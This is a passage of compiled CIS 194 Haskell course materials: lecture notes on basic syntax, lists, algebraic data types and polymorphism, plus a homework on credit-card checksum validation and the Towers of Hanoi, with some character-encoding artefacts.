operator. Note also that negative numbers must often be surrounded by
parentheses, to avoid having the negation sign parsed as
subtraction. (Yes, this is ugly. I'm sorry.)

This, however, gives an error::

   > -- badArith1 = i + n

Addition is only between values of the same numeric type, and
Haskell does not do implicit conversion. You must explicitly
convert with:

-   `fromIntegral`: converts from any integral type (`Int` or
    `Integer`) to any other numeric type.

-   `round`, `floor`, `ceiling`: convert floating-point numbers to
    `Int` or `Integer`.


Now try this::

   > -- badArith2 = i / i

This is an error since `/` performs floating-point division only.
For integer division we can use `div`.::

   > ex08 = i `div` i
   > ex09 = 12 `div` 5

If you are used to other languages which do implicit conversion of
numeric types, this can all seem rather prudish and annoying at first.
However, I promise you'll get used to it---and in time you may even
come to appreciate it.  Implicit numeric conversion encourages sloppy
thinking about numeric code.

Boolean logic
-------------

As you would expect, Boolean values can be combined with `(&&)`
(logical and), `(||)` (logical or), and `not`. For example,
::

   > ex10 = True && False
   > ex11 = not (False || True)

Things can be compared for equality with `(==)` and `(/=)`, or
compared for order using `(<)`, `(>)`, `(<=)`, and `(>=)`.
::

   > ex12 = ('a' == 'a')
   > ex13 = (16 /= 3)
   > ex14 = (5 > 3) && ('p' <= 'q')
   > ex15 = "Haskell" > "C++"

Haskell also has `if`-expressions: `if b then t else f` is an
expression which evaluates to `t` if the Boolean expression `b`
evaluates to `True`, and `f` if `b` evaluates to `False`.  Notice that
`if`-*expressions* are very different than `if`-*statements*.  For
example, with an if-statement, the `else` part can be optional; an
omitted `else` clause means "if the test evaluates to `False` then do
nothing".  With an `if`-expression, on the other hand, the `else` part
is required, since the `if`-expression must result in some value.

Idiomatic Haskell does not use `if` expressions very much, often using
pattern-matching or *guards* instead (see the next section).

Defining basic functions
------------------------

We can write functions on integers by cases.

> -- Compute the sum of the integers from 1 to n.
> sumtorial :: Integer -> Integer
> sumtorial 0 = 0
> sumtorial n = n + sumtorial (n-1)

Note the syntax for the type of a function: `sumtorial :: Integer ->
Integer` says that `sumtorial` is a function which takes an `Integer`
as input and yields another `Integer` as output.

Each clause is checked in order from top to bottom, and the first
matching clause is chosen.  For example, `sumtorial 0` evaluates to
`0`, since the first clause is matched.  `sumtorial 3` does not match
the first clause (`3` is not `0`), so the second clause is tried.  A
variable like `n` matches anything, so the second clause matches and
`sumtorial 3` evaluates to `3 + sumtorial (3-1)` (which can then be
evaluated further).

Choices can also be made based on arbitrary Boolean expressions using
*guards*.  For example::

   > hailstone :: Integer -> Integer
   > hailstone n
   >   | n `mod` 2 == 0 = n `div` 2
   >   | otherwise      = 3*n + 1

Any number of guards can be associated with each clause of a function
definition, each of which is a Boolean expression.  If the clause's
patterns match, the guards are evaluated in order from top to bottom,
and the first one which evaluates to `True` is chosen.  If none of the
guards evaluate to `True`, matching continues with the next clause.

For example, suppose we evaluate `hailstone 3`.  First, `3` is matched
against `n`, which succeeds (since a variable matches anything).
Next, ``n `mod` 2 == 0`` is evaluated; it is `False` since `n = 3`
does not result in a remainder of `0` when divided by `2`.
`otherwise` is just an convenient synonym for `True`, so the second
guard is chosen, and the result of `hailstone 3` is thus `3*3 + 1 =
10`.

As a more complex (but more contrived) example::

   > foo :: Integer -> Integer
   > foo 0 = 16
   > foo 1 
   >   | "Haskell" > "C++" = 3
   >   | otherwise         = 4
   > foo n
   >   | n < 0            = 0
   >   | n `mod` 17 == 2  = -43
   >   | otherwise        = n + 3

What is `foo (-3)`? `foo 0`? `foo 1`? `foo 36`? `foo 38`?

As a final note about Boolean expressions and guards, suppose we
wanted to abstract out the test of evenness used in defining
`hailstone`.  A first attempt is shown below::

   > isEven :: Integer -> Bool
   > isEven n 
   >   | n `mod` 2 == 0 = True
   >   | otherwise      = False

This *works*, but it is much too complicated.  Can you see why?

Pairs
-----

We can pair things together like so::

   > p :: (Int, Char)
   > p = (3, 'x')

Notice that the `(x,y)` notation is used both for the *type* of a pair
and a pair *value*.

The elements of a pair can be extracted again with 
*pattern matching*:

> sumPair :: (Int,Int) -> Int
> sumPair (x,y) = x + y

Haskell also has triples, quadruples, ... but you should never use
them. As we'll see next week, there are much better ways to package
three or more pieces of information together.

Using functions, and multiple arguments
---------------------------------------

To apply a function to some arguments, just list the arguments after
the function, separated by spaces, like this:

> f :: Int -> Int -> Int -> Int
> f x y z = x + y + z
> exFF = f 3 17 8

The above example applies the function `f` to the three arguments `3`,
`17`, and `8`.  Note also the syntax for the type of a function with
multiple arguments, like `Arg1Type -> Arg2Type -> ... -> ResultType`.
This might seem strange to you (and it should!).  Why all the arrows?
Wouldn't it make more sense for the type of `f` to be something like
`Int Int Int -> Int`?  Actually, the syntax is no accident: it is the
way it is for a very deep and beautiful reason, which we'll learn
about in a few weeks; for now you just have to take my word for it!

Note that **function application has higher precedence than any infix
operators**.  So it would be incorrect to write::

   `f 3 n+1 7`

if you intend to pass `n+1` as the second argument to `f`, because
this parses as::

   `(f 3 n) + (1 7)`.

Instead, one must write::

   `f 3 (n+1) 7`.

Lists
-----

*Lists* are one of the most basic data types in Haskell.
::

> nums, range, range2 :: [Integer]
> nums   = [1,2,3,19]
> range  = [1..100]
> range2 = [2,4..100]

Haskell (like Python) also has *list comprehensions*; you can read
about them in [LYAH](http://learnyouahaskell.com/starting-out).

Strings are just lists of characters. That is, `String` is just an
abbreviation for `[Char]`, and string literal syntax (text surrounded
by double quotes) is just an abbreviation for a list of `Char` literals.
::

> -- hello1 and hello2 are exactly the same.
>
> hello1 :: [Char]
> hello1 = ['h', 'e', 'l', 'l', 'o']
>
> hello2 :: String
> hello2 = "hello"
>
> helloSame = hello1 == hello2

This means that all the standard library functions for processing
lists can also be used to process `String`s.

Constructing lists
------------------

The simplest possible list is the empty list: 
::

> emptyList = []

Other lists are built up from the empty list using the *cons*
operator, `(:)`. Cons takes an element and a list, and produces a
new list with the element prepended to the front.
::

> ex17 = 1 : []
> ex18 = 3 : (1 : [])
> ex19 = 2 : 3 : 4 : []

> ex20 = [2,3,4] == 2 : 3 : 4 : []

We can see that `[2,3,4]` notation is just convenient shorthand for
`2 : 3 : 4 : []`. Note also that these are really
*singly linked lists*, NOT arrays.
::

> -- Generate the sequence of hailstone iterations from a starting number.
> hailstoneSeq :: Integer -> [Integer]
> hailstoneSeq 1 = [1]
> hailstoneSeq n = n : hailstoneSeq (hailstone n)

We stop the hailstone sequence when we reach 1.  The hailstone
sequence for a general `n` consists of `n` itself, followed by the
hailstone sequence for `hailstone n`, that is, the number obtained by
applying the hailstone transformation once to `n`.


Functions on lists
------------------

We can write functions on lists using *pattern matching*. 
::

> -- Compute the length of a list of Integers.
> intListLength :: [Integer] -> Integer
> intListLength []     = 0
> intListLength (x:xs) = 1 + intListLength xs

The first clause says that the length of an empty list is 0.  The
second clause says that if the input list looks like `(x:xs)`, that
is, a first element `x` consed onto a remaining list `xs`, then the
length is one more than the length of `xs`.

Since we don't use `x` at all we could also replace it by an
underscore: `intListLength (_:xs) = 1 + intListLength xs`.

We can also use nested patterns::

> sumEveryTwo :: [Integer] -> [Integer]
> sumEveryTwo []         = []     -- Do nothing to the empty list
> sumEveryTwo (x:[])     = [x]    -- Do nothing to lists with a single element
> sumEveryTwo (x:(y:zs)) = (x + y) : sumEveryTwo zs

Note how the last clause matches a list starting with `x` and followed
by... a list starting with `y` and followed by the list `zs`.  We
don't actually need the extra parentheses, so `sumEveryTwo (x:y:zs) =
...` would be equivalent.


Combining functions
-------------------

It's good Haskell style to build up more complex functions by
combining many simple ones.
::

> -- The number of hailstone steps needed to reach 1 from a starting
> -- number.
> hailstoneLen :: Integer -> Integer
> hailstoneLen n = intListLength (hailstoneSeq n) - 1

This may seem inefficient to you: it generates the entire hailstone
sequence first and then finds its length, which wastes lots of
memory... doesn't it? Actually, it doesn't! Because of Haskell's
lazy evaluation, each element of the sequence is only generated as
needed, so the sequence generation and list length calculation are
interleaved. The whole computation uses only O(1) memory, no matter
how long the sequence. (Actually, this is a tiny white lie, but
explaining why (and how to fix it) will have to wait a few weeks.)

We'll learn more about Haskell's lazy evaluation strategy in a few
weeks. For now, the take-home message is: don't be afraid to write
small functions that transform whole data structures, and combine
them to produce more complex functions. It may feel unnatural at
first, but it's the way to write idiomatic (and efficient) Haskell,
and is actually a rather pleasant way to write programs once you
get used to it.


A word about error messages
---------------------------

Actually, six: 

**Don't be scared of error messages!**

GHC's error messages can be rather long and (seemingly) scary.
However, usually they're long not because they are obscure, but
because they contain a lot of useful information!  Here's an example:
::

    Prelude> 'x' ++ "foo"

    <interactive>:1:1:
        Couldn't match expected type `[a0]' with actual type `Char'
        In the first argument of `(++)', namely 'x'
        In the expression: 'x' ++ "foo"
        In an equation for `it': it = 'x' ++ "foo"

First we are told "Couldn't match expected type `[a0]` with actual
type `Char`".  This means that *something* was expected to have a list
type, but actually had type `Char`.  What something?  The next line
tells us: it's the first argument of `(++)` which is at fault, namely,
`'x'`.  The next lines go on to give us a bit more context.  Now we
can see what the problem is: clearly `'x'` has type `Char`, as the
first line said.  Why would it be expected to have a list type?  Well,
because it is used as an argument to `(++)`, which takes a list as its
first argument.

When you get a huge error message, resist your initial impulse to run
away; take a deep breath; and read it carefully.  You won't
necessarily understand the entire thing, but you will probably learn a
lot, and you may just get enough information to figure out what the
problem is.


/CS194 Homework 01
========================================

https://www.seas.upenn.edu/~cis1940/spring13/hw/01-intro.pdf

CIS 194: Homework 1 
Due Monday, January 14

When solving the homework, strive to create not just code that
works, but code that is stylish and concise. See the style guide on
the website for some general guidelines. Try to write small functions
which perform just a single task, and then combine those smaller
pieces to create more complex functions. Don‚Äôt repeat yourself: write
one function for each logical task, and reuse functions as necessary.

Be sure to write functions with exactly the specified name and
type signature for each exercise (to help us test your code). You may
create additional helper functions with whatever names and type
signatures you wish.

Validating Credit Card Numbers1

Adapted from the first practicum assigned in the University of Utrecht functional
programming course taught by Doaitse Swierstra, 2008-2009.

Have you ever wondered how websites validate your credit card
number when you shop online? They don‚Äôt check a massive database
of numbers, and they don‚Äôt use magic. In fact, most credit providers
rely on a checksum formula for distinguishing valid numbers from
random collections of digits (or typing mistakes).

In this section, you will implement the validation algorithm for
credit cards. It follows these steps:

*  Double the value of every second digit beginning from the right.
   That is, the last digit is unchanged; the second-to-last digit is doubled; 
   the third-to-last digit is unchanged; and so on. For example,
   [1,3,8,6] becomes [2,3,16,6].

*  Add the digits of the doubled values and the undoubled digits from the original number. 
   For example, [2,3,16,6] becomes 2+3+1+6+6 = 18.
   
*  Calculate the remainder when the sum is divided by 10. For the
   above example, the remainder would be 8.

If the result equals 0, then the number is valid.

Exercise 1 We need to first find the digits of a number. Define the functions::

   toDigits :: Integer -> [Integer]
   toDigitsRev :: Integer -> [Integer]

toDigits should convert positive Integers to a list of digits. 
(For 0 or negative inputs, toDigits should return the empty list.) 
toDigitsRev should do the same, but with the digits reversed.::

   Example: toDigits 1234 == [1,2,3,4]
   Example: toDigitsRev 1234 == [4,3,2,1]
   Example: toDigits 0 == []
   Example: toDigits (-17) == []

Exercise 2 Once we have the digits in the proper order, we need to
double every other one. Define a function::

   doubleEveryOther :: [Integer] -> [Integer]

Remember that doubleEveryOther should double every other number beginning from 
the right, that is, the second-to-last, fourth-to-last,
. . . numbers are doubled.

   Example: doubleEveryOther [8,7,6,5] == [16,7,12,5]
   Example: doubleEveryOther [1,2,3] == [1,4,3]

Exercise 3 The output of doubleEveryOther has a mix of one-digit
and two-digit numbers. Define the function::

   sumDigits :: [Integer] -> Integer

to calculate the sum of all digits.
Example: sumDigits [16,7,12,5] = 1 + 6 + 7 + 1 + 2 + 5 = 22

Exercise 4 Define the function ::

   validate :: Integer -> Bool

that indicates whether an Integer could be a valid credit card number. 
This will use all functions defined in the previous exercises.::

   Example: validate 4012888888881881 = True
   Example: validate 4012888888881882 = False

The Towers of Hanoi2

Adapted from an assignment given in UPenn CIS 552, taught by Benjamin Pierce

Exercise 5 The Towers of Hanoi is a classic puzzle with a solution
that can be described recursively. Disks of different sizes are stacked
on three pegs; the goal is to get from a starting configuration with
all disks stacked on the first peg to an ending configuration with all
disks stacked on the last peg, as shown in Figure 1.::

      =           |            |
     ===          |            |
    =====         |            |
   =======        |            |
   ---+-----------+------------+-------
   
                  ‚áì

      |           |            =       
      |           |           ===      
      |           |          =====     
      |           |         =======    
   ---+-----------+------------+-------

   Figure 1: The Towers of Hanoi

The only rules are 

*  you may only move one disk at a time, and
*  a larger disk may never be stacked on top of a smaller one.

For example, as the first move all you can do is move the topmost,
smallest disk onto a different peg, since only one disk may be moved
at a time.

Figure 2: A valid first move. From this point, it is illegal to move to 
the configuration shown in
Figure 3, because you are not allowed to put the green disk on top of
the smaller blue one.

Figure 3: An illegal configuration.
To move n discs (stacked in increasing size) from peg a to peg b
using peg c as temporary storage,

1. move n ‚àí 1 discs from a to c using b as temporary storage
2. move the top disc from a to b
3. move n ‚àí 1 discs from c to b using a as temporary storage.

For this exercise, define a function hanoi with the following type:

   type Peg = String
   type Move = (Peg, Peg)
   hanoi :: Integer -> Peg -> Peg -> Peg -> [Move]

Given the number of discs and names for the three pegs, hanoi
should return a list of moves to be performed to move the stack of
discs from the first peg to the second.

Note that a type declaration, like type Peg = String above, makes
a type synonym. In this case Peg is declared as a synonym for String,
and the two names Peg and String can now be used interchangeably.
Giving more descriptive names to types in this way can be used to
give shorter names to complicated types, or (as here) simply to help
with documentation.

Example: hanoi 2 "a" "b" "c" == [("a","c"), ("a","b"), ("c","b")]

Exercise 6 (Optional) What if there are four pegs instead of three?
That is, the goal is still to move a stack of discs from the first peg to
the last peg, without ever placing a larger disc on top of a smaller
one, but now there are two extra pegs that can be used as ‚Äútemporary‚Äù storage 
instead of only one. Write a function similar to hanoi
which solves this problem in as few moves as possible.

It should be possible to do it in far fewer moves than with three
pegs. For example, with three pegs it takes 215 ‚àí 1 = 32767 moves
to transfer 15 discs. With four pegs it can be done in 129 moves. (See
Exercise 1.17 in Graham, Knuth, and Patashnik, Concrete Mathematics,
second ed., Addison-Wesley, 1994.)


/CS194 Lectures 02 Algebraic data types
========================================

- https://www.seas.upenn.edu/~cis1940/spring13/lectures/02-ADTs.lhs
- https://www.seas.upenn.edu/~cis1940/spring13/lectures/02-ADTs.html


CIS 194 Week 2  
21 January 2013

Suggested reading: 

  * [Real World Haskell](http://book.realworldhaskell.org/),
    chapters 2 and 3

Enumeration types
-----------------

Like many programming languages, Haskell allows programmers to create
their own *enumeration* types.  Here's a simple example:

> data Thing = Shoe 
>            | Ship 
>            | SealingWax 
>            | Cabbage 
>            | King
>   deriving Show

This declares a new type called `Thing` with five *data constructors*
`Shoe`, `Ship`, etc. which are the (only) values of type `Thing`.
(The `deriving Show` is a magical incantation which tells GHC to
automatically generate default code for converting `Thing`s to
`String`s. This is what `ghci` uses when printing the value of
an expression of type `Thing`.)

> shoe :: Thing
> shoe = Shoe
>
> listO'Things :: [Thing]
> listO'Things = [Shoe, SealingWax, King, Cabbage, King]

We can write functions on `Thing`s by *pattern-matching*.

> isSmall :: Thing -> Bool
> isSmall Shoe       = True
> isSmall Ship       = False
> isSmall SealingWax = True
> isSmall Cabbage    = True
> isSmall King       = False

Recalling how function clauses are tried in order from top to bottom,
we could also make the definition of `isSmall` a bit shorter like so:

> isSmall2 :: Thing -> Bool
> isSmall2 Ship = False
> isSmall2 King = False
> isSmall2 _    = True

Beyond enumerations
-------------------

`Thing` is an *enumeration type*, similar to those provided by other
languages such as Java or C++.  However, enumerations are actually
only a special case of Haskell's more general *algebraic data types*.
As a first example of a data type which is not just an enumeration,
consider the definition of `FailableDouble`:

> data FailableDouble = Failure
>                     | OK Double
>   deriving Show

This says that the `FailableDouble` type has two data constructors.
The first one, `Failure`, takes no arguments, so `Failure` by itself
is a value of type `FailableDouble`.  The second one, `OK`, takes an
argument of type `Double`.  So `OK` by itself is not a value of type
`FailableDouble`; we need to give it a `Double`.  For example, `OK
3.4` is a value of type `FailableDouble`.

> exD1 = Failure
> exD2 = OK 3.4

Thought exercise: what is the type of `OK`? 

> safeDiv :: Double -> Double -> FailableDouble
> safeDiv _ 0 = Failure
> safeDiv x y = OK (x / y)

More pattern-matching!  Notice how in the `OK` case we can give a name
to the `Double` that comes along with it.

> failureToZero :: FailableDouble -> Double
> failureToZero Failure = 0
> failureToZero (OK d)  = d

Data constructors can have more than one argument.

> -- Store a person's name, age, and favourite Thing.
> data Person = Person String Int Thing
>   deriving Show
>
> brent :: Person
> brent = Person "Brent" 31 SealingWax
>
> stan :: Person
> stan  = Person "Stan" 94 Cabbage
>
> getAge :: Person -> Int
> getAge (Person _ a _) = a

Notice how the type constructor and data constructor are both named
`Person`, but they inhabit different namespaces and are different
things.  This idiom (giving the type and data constructor of a
one-constructor type the same name) is common, but can be confusing
until you get used to it.

Algebraic data types in general
-------------------------------

In general, an algebraic data type has one or more data constructors,
and each data constructor can have zero or more arguments.

    data AlgDataType = Constr1 Type11 Type12
                     | Constr2 Type21
                     | Constr3 Type31 Type32 Type33
                     | Constr4

This specifies that a value of type `AlgDataType` can be constructed
in one of four ways: using `Constr1`, `Constr2`, `Constr3`, or
`Constr4`.  Depending on the constructor used, an `AlgDataType` value
may contain some other values.  For example, if it was constructed
using `Constr1`, then it comes along with two values, one of type
`Type11` and one of type `Type12`.

One final note: type and data constructor names must always start with
a capital letter; variables (including names of functions) must always
start with a lowercase letter.  (Otherwise, Haskell parsers would have
quite a difficult job figuring out which names represent variables and
which represent constructors).

Pattern-matching
----------------

We've seen pattern-matching in a few specific cases, but let's see how
pattern-matching works in general.  Fundamentally, pattern-matching is
about taking apart a value by *finding out which constructor* it was
built with.  This information can be used as the basis for deciding
what to do---indeed, in Haskell, this is the *only* way to make a
decision.

For example, to decide what to do with a value of type `AlgDataType`
(the made-up type defined in the previous section), we could write
something like

    foo (Constr1 a b)   = ...
    foo (Constr2 a)     = ...
    foo (Constr3 a b c) = ...
    foo Constr4         = ...

Note how we also get to give names to the values that come along with
each constructor.  Note also that parentheses are required around
patterns consisting of more than just a single constructor.

This is the main idea behind patterns, but there are a few more things
to note.  

  1. An underscore `_` can be used as a "wildcard pattern" which
    matches anything.

  1. A pattern of the form `x@pat` can be used to match a value against
    the pattern `pat`, but *also* give the name `x` to the entire value
    being matched.  For example:

    > baz :: Person -> String
    > baz p@(Person n _ _) = "The name field of (" ++ show p ++ ") is " ++ n

        *Main> baz brent
        "The name field of (Person \"Brent\" 31 SealingWax) is Brent"

  1. Patterns can be *nested*. For example:

    > checkFav :: Person -> String
    > checkFav (Person n _ SealingWax) = n ++ ", you're my kind of person!"
    > checkFav (Person n _ _)          = n ++ ", your favorite thing is lame."

        *Main> checkFav brent
        "Brent, you're my kind of person!"
        *Main> checkFav stan
        "Stan, your favorite thing is lame."

    Note how we nest the pattern `SealingWax` inside the pattern for
    `Person`.

In general, the following grammar defines what can be used as a
pattern:

    pat ::= _
         |  var
         |  var @ ( pat )
         |  ( Constructor pat1 pat2 ... patn )

The first line says that an underscore is a pattern.  The second line
says that a variable by itself is a pattern: such a pattern matches
anything, and "binds" the given variable name to the matched value.
The third line specifies `@`-patterns.  The last line says that a
constructor name followed by a sequence of patterns is itself a
pattern: such a pattern matches a value if that value was constructed
using the given constructor, *and* `pat1` through `patn` all match the
values contained by the constructor, recursively.

(In actual fact, the full grammar of patterns includes yet more
features still, but the rest would take us too far afield for now.)

Note that literal values like `2` or `'c'` can be thought of as
constructors with no arguments.  It is as if the types `Int` and
`Char` were defined like

    data Int  = 0 | 1 | -1 | 2 | -2 | ...
    data Char = 'a' | 'b' | 'c' | ...

which means that we can pattern-match against literal values.  (Of
course, `Int` and `Char` are not *actually* defined this way.)

Case expressions
----------------

The fundamental construct for doing pattern-matching in Haskell is the
`case` expression. In general, a `case` expression looks like

    case exp of
      pat1 -> exp1
      pat2 -> exp2
      ...

When evaluated, the expression `exp` is matched against each of the
patterns `pat1`, `pat2`, ... in turn.  The first matching pattern is
chosen, and the entire `case` expression evaluates to the expression
corresponding to the matching pattern.  For example,

> exCase = case "Hello" of
>            []      -> 3
>            ('H':s) -> length s
>            _       -> 7

evaluates to `4` (the second pattern is chosen; the third pattern
matches too, of course, but it is never reached).

In fact, the syntax for defining functions we have seen is really just
convenient syntax sugar for defining a `case` expression.  For
example, the definition of `failureToZero` given previously can
equivalently be written as

> failureToZero' :: FailableDouble -> Double
> failureToZero' x = case x of
>                      Failure -> 0
>                      OK d    -> d

Recursive data types
--------------------

Data types can be *recursive*, that is, defined in terms of
themselves.  In fact, we have already seen a recursive type---the type
of lists.  A list is either empty, or a single element followed by a
remaining list.  We could define our own list type like so:

> data IntList = Empty | Cons Int IntList

Haskell's own built-in lists are quite similar; they just get to use
special built-in syntax (`[]` and `:`).  (Of course, they also work
for any type of elements instead of just `Int`s; more on this next
week.)

We often use recursive functions to process recursive data types:

> intListProd :: IntList -> Int
> intListProd Empty      = 1
> intListProd (Cons x l) = x * intListProd l

As another simple example, we can define a type of binary trees with
an `Int` value stored at each internal node, and a `Char` stored at
each leaf:

> data Tree = Leaf Char
>           | Node Tree Int Tree
>   deriving Show

(Don't ask me what you would use such a tree for; it's an example,
OK?)  For example,

> tree :: Tree
> tree = Node (Leaf 'x') 1 (Node (Leaf 'y') 2 (Leaf 'z'))


/CS194 Lectures 03 Recursion patterns, polymorphism, and the Prelude
====================================================================

<!--
{-# OPTIONS_GHC -Wall #-}
-->

CIS 194 Week 3  
28 January 2013

While completing HW 2, you probably spent a lot of time writing
explicitly recursive functions.  At this point, you might think that's
what Haskell programmers spend most of their time doing.  In fact,
experienced Haskell programmers *hardly ever* write recursive
functions!

How is this possible? The key is to notice that although recursive
functions can theoretically do pretty much anything, in practice there
are certain common patterns that come up over and over again.  By
abstracting out these patterns into library functions, programmers can
leave the low-level details of actually doing recursion to these
functions, and think about problems at a higher level---that's the
goal of *wholemeal programming*.

Recursion patterns
------------------

Recall our simple definition of lists of `Int` values: 

> data IntList = Empty | Cons Int IntList
>   deriving Show

What sorts of things might we want to do with an `IntList`?  Here are
a few common possibilities:

  * Perform some operation on every element of the list

  * Keep only some elements of the list, and throw others away, based
    on a test

  * "Summarize" the elements of the list somehow (find their sum,
    product, maximum...).

  * You can probably think of others!

**Map**

Let's think about the first one ("perform some operation on every
element of the list").  For example, we could add one to every element
in a list:

 <!-- CLASS

**Write `addOneToAll` in class** 

-->

 <!-- HTML

> addOneToAll :: IntList -> IntList
> addOneToAll Empty       = Empty
> addOneToAll (Cons x xs) = Cons (x+1) (addOneToAll xs)

-->

Or we could ensure that every element in a list is nonnegative by
taking the absolute value:

> absAll :: IntList -> IntList
> absAll Empty       = Empty
> absAll (Cons x xs) = Cons (abs x) (absAll xs)

Or we could square every element:

> squareAll :: IntList -> IntList
> squareAll Empty       = Empty
> squareAll (Cons x xs) = Cons (x*x) (squareAll xs)

At this point, big flashing red lights and warning bells should be
going off in your head.  These three functions look way too similar.
There ought to be some way to abstract out the commonality so we don't
have to repeat ourselves!

There is indeed a way---can you figure it out?  Which parts are the
same in all three examples and which parts change?

The thing that changes, of course, is the operation we want to perform
on each element of the list.  We can specify this operation as a
*function* of type `Int -> Int`.  Here is where we begin to see how
incredibly useful it is to be able to pass functions as inputs to
other functions!

 <!-- CLASS

**Write `mapIntList` in class.**

-->

 <!-- HTML

> mapIntList :: (Int -> Int) -> IntList -> IntList
> mapIntList _ Empty       = Empty
> mapIntList f (Cons x xs) = Cons (f x) (mapIntList f xs)

-->

We can now use `mapIntList` to implement `addOneToAll`, `absAll`, and
`squareAll`:

> exampleList = Cons (-1) (Cons 2 (Cons (-6) Empty))
>
> addOne x = x + 1
> square x = x * x

    mapIntList addOne exampleList
    mapIntList abs    exampleList
    mapIntList square exampleList

**Filter**

Another common pattern is when we want to keep only some elements of a
list, and throw others away, based on a test.  For example, we might
want to keep only the positive numbers:

 <!-- CLASS

**Write `keepOnlyPositive` in class**

-->

 <!-- HTML

> keepOnlyPositive :: IntList -> IntList
> keepOnlyPositive Empty = Empty
> keepOnlyPositive (Cons x xs) 
>   | x > 0     = Cons x (keepOnlyPositive xs)
>   | otherwise = keepOnlyPositive xs

-->

Or only the even ones:

> keepOnlyEven :: IntList -> IntList
> keepOnlyEven Empty = Empty
> keepOnlyEven (Cons x xs)
>   | even x    = Cons x (keepOnlyEven xs)
>   | otherwise = keepOnlyEven xs

How can we generalize this pattern?  What stays the same, and what do
we need to abstract out?

 <!-- CLASS

**Write `filterIntList` in class.**

-->

 <!-- HTML

The thing to abstract out is the *test* (or *predicate*) used to
determine which values to keep.  A predicate is a function of type
`Int -> Bool` which returns `True` for those elements which should be
kept, and `False` for those which should be discarded.  So we can
write `filterIntList` as follows:

> filterIntList :: (Int -> Bool) -> IntList -> IntList
> filterIntList _ Empty = Empty
> filterIntList p (Cons x xs)
>   | p x       = Cons x (filterIntList p xs)
>   | otherwise = filterIntList p xs

-->

**Fold**

The final pattern we mentioned was to "summarize" the elements of the
list; this is also variously known as a "fold" or "reduce" operation.
We'll come back to this next week.  In the meantime, you might want to
think about how to abstract out this pattern!

Polymorphism
------------

We've now written some nice, general functions for mapping and
filtering over lists of `Int`s.  But we're not done generalizing!
What if we wanted to filter lists of `Integer`s? or `Bool`s?  Or
lists of lists of trees of stacks of `String`s?  We'd have to make a
new data type and a new function for each of these cases.  Even worse,
the *code would be exactly the same*; the only thing that would be
different is the *type signatures*.  Can't Haskell help us out here?

Of course it can! Haskell supports *polymorphism* for both data types
and functions.  The word "polymorphic" comes from Greek (œÄŒøŒª·ΩªŒºŒøœÅœÜŒøœÇ)
and means "having many forms": something which is polymorphic works
for multiple types.

**Polymorphic data types**

First, let's see how to declare a polymorphic data type.

> data List t = E | C t (List t)

(We can't reuse `Empty` and `Cons` since we already used those for the
constructors of `IntList`, so we'll use `E` and `C` instead.)  Whereas
before we had `data IntList = ...`, we now have `data List t = ...`
The `t` is a *type variable* which can stand for any type.  (Type
variables must start with a lowercase letter, whereas types must start
with uppercase.)  `data List t = ...` means that the `List` type is
*parameterized* by a type, in much the same way that a function can be
parameterized by some input.

Given a type `t`, a `(List t)` consists of either the constructor `E`,
or the constructor `C` along with a value of type `t` and another
`(List t)`.  Here are some examples:

> lst1 :: List Int
> lst1 = C 3 (C 5 (C 2 E))
>
> lst2 :: List Char
> lst2 = C 'x' (C 'y' (C 'z' E))
>
> lst3 :: List Bool
> lst3 = C True (C False E)

**Polymorphic functions**

Now, let's generalize `filterIntList` to work over our new polymorphic
`List`s.  We can just take code of `filterIntList` and replace `Empty`
by `E` and `Cons` by `C`:

> filterList _ E = E
> filterList p (C x xs)
>   | p x       = C x (filterList p xs)
>   | otherwise = filterList p xs

Now, what is the type of `filterList`?  Let's see what type `ghci`
infers for it:

    *Main> :t filterList
    filterList :: (t -> Bool) -> List t -> List t    

We can read this as: "for any type `t`, 
`filterList` takes a function from `t` to `Bool`, and a list of
`t`'s, and returns a list of `t`'s."

What about generalizing `mapIntList`?  What type should we give to a
function `mapList` that applies a function to every element in a
`List t`?

Our first idea might be to give it the type

~~~~ {.haskell}
mapList :: (t -> t) -> List t -> List t
~~~~

This works, but it means that when applying `mapList`, we always get a
list with the same type of elements as the list we started with.  This
is overly restrictive: we'd like to be able to do things like `mapList
show` in order to convert, say, a list of `Int`s into a list of
`String`s. Here, then, is the most general possible type for
`mapList`, along with an implementation:

> mapList :: (a -> b) -> List a -> List b
> mapList _ E        = E
> mapList f (C x xs) = C (f x) (mapList f xs)

One important thing to remember about polymorphic functions is that
**the caller gets to pick the types**.  When you write a polymorphic
function, it must work for every possible input type.  This---together
with the fact that Haskell has no way to directly make make decisions
based on what type something is---has some interesting implications
which we'll explore later.

The Prelude
-----------

The `Prelude` is a module with a bunch of standard definitions that
gets implicitly imported into every Haskell program.  It's worth
spending some time [skimming through its
documentation](http://haskell.org/ghc/docs/latest/html/libraries/base/Prelude.html)
to familiarize oneself with the tools that are available.

Of course, polymorphic lists are defined in the `Prelude`, along with
[many useful polymorphic functions for working with
them](http://haskell.org/ghc/docs/latest/html/libraries/base/Prelude.html#11).
For example, `filter` and `map` are the counterparts to our
`filterList` and `mapList`.  In fact, the [`Data.List` module contains
many more list functions
still](http://www.haskell.org/ghc/docs/latest/html/libraries/base/Data-List.html).  

Another useful polymorphic type to know is `Maybe`, defined as

~~~~ {.haskell}
data Maybe a = Nothing | Just a
~~~~

A value of type `Maybe a` either contains a value of type `a` (wrapped
in the `Just` constructor), or it is `Nothing` (representing some sort
of failure or error). The [`Data.Maybe` module has functions for
working with `Maybe`
values](http://www.haskell.org/ghc/docs/latest/html/libraries/base/Data-Maybe.html).

Total and partial functions
---------------------------

Consider this polymorphic type: 

~~~~ {.haskell}
[a] -> a
~~~~

What functions could have such a type?  The type says that given a
list of things of type `a`, the function must produce some value of
type `a`.  For example, the Prelude function `head` has this type.  

...But what happens if `head` is given an empty list as input?  Let's
look at the [source
code](http://www.haskell.org/ghc/docs/latest/html/libraries/base/src/GHC-List.html#head)
for `head`...  

It crashes!  There's nothing else it possibly could do, since it must
work for *all* types.  There's no way to make up an element of an
arbitrary type out of thin air.

`head` is what is known as a *partial function*: there are certain
inputs for which `head` will crash.  Functions which have certain
inputs that will make them recurse infinitely are also called partial.
Functions which are well-defined on all possible inputs are known as
*total functions*.

It is good Haskell practice to avoid partial functions as much as
possible.  Actually, avoiding partial functions is good practice in
*any* programming language---but in most of them it's ridiculously
annoying.  Haskell tends to make it quite easy and sensible.

**`head` is a mistake!** It should not be in the `Prelude`.  Other
partial `Prelude` functions you should almost never use include
`tail`, `init`, `last`, and `(!!)`.  From this point on, using one of
these functions on a homework assignment will lose style points!

What to do instead? 

**Replacing partial functions**

Often partial functions like `head`, `tail`, and so on can be replaced
by pattern-matching.  Consider the following two definitions:

> doStuff1 :: [Int] -> Int
> doStuff1 []  = 0
> doStuff1 [_] = 0
